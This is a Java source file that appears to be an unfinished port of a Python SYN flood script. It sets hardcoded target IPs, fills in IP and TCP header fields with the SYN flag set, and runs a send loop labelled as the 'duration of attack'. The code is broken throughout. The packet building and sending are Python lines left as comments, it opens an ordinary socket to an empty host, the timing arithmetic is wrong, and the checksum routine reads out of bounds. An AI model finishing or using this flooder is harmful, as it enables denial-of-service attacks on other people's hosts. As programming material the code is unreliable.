import java.util.Scanner;
import java.util.Date;
import java.net.Socket;
import java.io.IOException;
import java.net.InetAddress;
import java.net.*;	

public class TCPSyn
{	
	public static void main(String[] args)
	{
		String serverIP = ""; //hostname
		int tcpPort = 0;

		/* create a raw socket */
		try{
			Socket socket = new Socket(serverIP, tcpPort);
		}
		catch(IOException e){
			System.out.println(e.getMessage());
			System.out.println("Socket could not be created");
			//System.exit(0);
		}
		System.out.println("SUCCESS");

		/* tell kernel not to put in headers, since we are providing it, when using IPPROTO_RAW this is not necessary
		 s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1) */
	     
		/* now start constructing the packet */
		String packet = "";

		String source_ip = "10.1.12.66";
		String destination_ip = "10.1.12.173";

		/* ip header fields */
		int ip_ihl = 5;
		int ip_ver = 4;
		int ip_tos = 0;
		int ip_tot_len = 0; //kernel will fill the correct total lenght
		int ip_id = 54321; //Id of this packet
		int ip_frag_off = 0;
		int ip_ttl = 255;
		int ip_proto = tcpPort; //socket.IPPROTO_TCP
		int ip_check = 0; //kernel will fill the correct checksum
		try {
	        InetAddress ip_saddr = InetAddress.getByName(source_ip);
	    } catch (UnknownHostException e) {
	        throw new RuntimeException("Test failed. Unknown ip: " + args[0]);
	    }
		try {
	        InetAddress ip_daddr = InetAddress.getByName(destination_ip);
	    } catch (UnknownHostException e) {
	        throw new RuntimeException("Test failed. Unknown ip: " + args[0]);
	    }

		int ip_ihl_ver = (ip_ver << 4) + ip_ihl;

		/* the ! in the pack format string means network order */
		//String ip_header = pack('!BBHHHBBH4s4s' , ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

		/* tcp header fields */
		int tcp_source = 1234;   // source port
		int tcp_dest = 80;   // destination port
		int tcp_seq = 454;
		int tcp_ack_seq = 0;
		int tcp_doff = 5;    //4 bit field, size of tcp header, 5 * 4 = 20 bytes

		/* tcp flags */
		int tcp_fin = 0;
		int tcp_syn = 1;
		int tcp_rst = 0;
		int tcp_psh = 0;
		int tcp_ack = 0;
		int tcp_urg = 0;
		//int tcp_window = socket.htons(5840);   // maximum allowed window size
		int tcp_check = 0;
		int tcp_urg_ptr = 0;

		int tcp_offset_res = (tcp_doff << 4) + 0;
		int tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh <<3) + (tcp_ack << 4) + (tcp_urg << 5);

		/* the ! in the pack format string means network order */
		//int tcp_header =

		String userData = "Hello! How are you?";

		/* pseudo header fields */
		try {
	        InetAddress source_address = InetAddress.getByName(source_ip);
	    } catch (UnknownHostException e) {
	        throw new RuntimeException("Test failed. Unknown ip: " + args[0]);
	    }

		try {
	        InetAddress source_address = InetAddress.getByName(destination_ip);
	    } catch (UnknownHostException e) {
	        throw new RuntimeException("Test failed. Unknown ip: " + args[0]);
	    }

		int placeholder = 0;
		// protocol = socket.IPPROTO_TCP
		//int tcp_length = len(tcp_header) + len(user_data)

		// psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
		// psh = psh + tcp_header + user_data;
		 
		// tcp_check = checksum(psh)
		/* print tcp_checksum */
		 
		/* make the tcp header again and fill the correct checksum - remember checksum is NOT in network byte order */
		// tcp_header = pack('!HHLLBBH' , tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window) + pack('H' , tcp_check) + pack('!H' , tcp_urg_ptr)
		 
		/* final full packet - syn packets dont have any data */
		// packet = ip_header + tcp_header + user_data
		int sent = 0;
		/* Send the packet finally - the port specified has no effect */
		double st = (System.currentTimeMillis() * 1000);
		while(true){
		    double end = (System.currentTimeMillis() * 1000);
		    if(end-st < 60)// Change this value to change the duration of attack!!!
		    {
		        //socket.sendto(packet, (destination_ip , 0 ));
		        //DataOutputStream dOut = new DataOutputStream(socket.getOutputStream());
		        sent = sent + 1;
		    }
		    else
				System.exit(0);
		}

	}

	public int checkSum(String msg){
		int s = 0;

		/* Loop while taking only 2 characters at a time */
		for(int i = 0; i < msg.length(); ++i)
		{
			int w = (int)msg.charAt(i) + (int)msg.charAt(i+1) << 8;
			s += w;
		}

		s = (s >> 16) + (s & 0xffff);
		s = s + (s >> 16);

		/* complement and mask to 4 byte short */
		s = ~s & 0xffff;

		return s;
	}

}





